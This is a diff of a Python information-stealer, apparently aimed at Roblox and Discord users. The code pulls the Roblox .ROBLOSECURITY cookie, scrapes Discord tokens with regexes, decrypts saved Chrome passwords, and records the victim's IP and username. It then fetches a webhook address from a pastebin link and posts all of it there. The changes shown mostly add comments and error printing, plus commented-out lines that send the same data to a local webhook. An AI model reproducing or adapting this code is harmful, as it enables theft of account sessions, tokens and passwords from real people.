@@ -2,28 +2,39 @@ import browser_cookie3, os, re, requests
 import json, base64, sqlite3, win32crypt, shutil
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
+#======================================================#
+# THIS IS A PRODUCTION SCRIPT DO NOT USE AS ACTUAL STUB!
+#======================================================#
+# get pc username
 def get_user():
     try:
         userhome = os.path.expanduser('~')
         return os.path.split(userhome)[-1]
-    except:
+    except Exception as e:
+        print(e)
         return 'na'
         pass
+# get ip
 def get_ip():
     try:
-        return requests.get('https://api.ipify.org/?format=json', timeout=3).json()['ip']
-    except:
+        return requests.get('https://api.ipify.org/?format=json').json()['ip']
+    except Exception as e:
+        print(e)
         return 'na'
         pass
+# gets roblox cookie
 def roblox():
     try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com') 
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip() 
-        return cookie
-    except:
-        return 'na'
+        cookies = browser_cookie3.chrome(domain_name='roblox.com') # uses browser_cookie3 to get all cookies from domain
+        cookies = str(cookies) # makes cookies a string to split
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip() # gets cookie from all cookies
+        return cookie # returns cookie
+    except Exception as e:
+        print(e)
+        return 'na' # if it didnt work :(
         pass
+
+# for getting discord token
 def find_tokens(path):
     try:
         path += '\\Local Storage\\leveldb'
@@ -35,9 +46,11 @@ def find_tokens(path):
                 for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                     for token in re.findall(regex, line):
                         tokens.append(token)
-    except:
+    except Exception as e:
+        print(e)
         pass
     return tokens
+# gets token location(s)
 def get_tokens():
     try:
         local = os.getenv('LOCALAPPDATA')
@@ -62,8 +75,10 @@ def get_tokens():
             else:
                 pass
         return message
-    except:
+    except Exception as e:
+        print(e)
         pass
+# getting passwords
 def get_encryption_key():
     try:
         local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -76,7 +91,8 @@ def get_encryption_key():
         key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         key = key[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except:
+    except Exception as e:
+        print(e)
         pass
 def decrypt_password(password, key):
     try:
@@ -115,9 +131,11 @@ def get_chrome():
     db.close()
     try:
         os.remove(filename)
-    except:
+    except Exception as e:
+        print(e)
         pass
     return data
+
 def getandsenddata():
     passwords = get_chrome()
     cookie = roblox()
@@ -126,6 +144,7 @@ def getandsenddata():
     ip = get_ip()
     tmp = ''
     passwords = tmp.join(passwords)
+    # Check cookie data:
     try:
         reqr = requests.Session()
         reqr.cookies['.ROBLOSECURITY'] = cookie
@@ -151,6 +170,11 @@ def getandsenddata():
         HasPin = 'na'
         created = 'na'
         pass
+    # sends to api to check cookie
+    #r = requests.post(f'http://127.0.0.1:5000/webhook/{cookie}')
+    #print(r.content)
+    #r2 = requests.post(f'http://127.0.0.1:5000/webhook2/{pcuser}/{ip}/{discord_token}/{passwords}')
+    #print(r2.content)
     webhook = requests.get('https://pastebin.com/raw/yu9tYfC9').json()
     webhook = webhook['webhook']
     data = {
@@ -226,3 +250,4 @@ def getandsenddata():
     requests.post(webhook, json=data)
 if __name__ == "__main__":
     getandsenddata()
+    input('Finished!')
